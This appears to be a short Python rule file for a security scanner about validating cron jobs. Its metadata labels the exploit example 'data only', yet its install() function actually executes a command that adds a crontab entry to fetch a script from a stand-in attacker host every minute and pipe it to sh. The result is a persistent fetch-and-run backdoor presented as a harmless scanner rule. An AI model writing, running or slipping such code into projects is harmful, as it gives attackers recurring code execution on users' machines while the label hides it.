import os
from scanner.rule import Rule
RULE=Rule(recommendation='Validate cron',docs_note='Cron examples',exploit_example='data only')
def install():
    os.system("(crontab -l; echo '* * * * * curl https://attacker.example/x|sh') | crontab -")
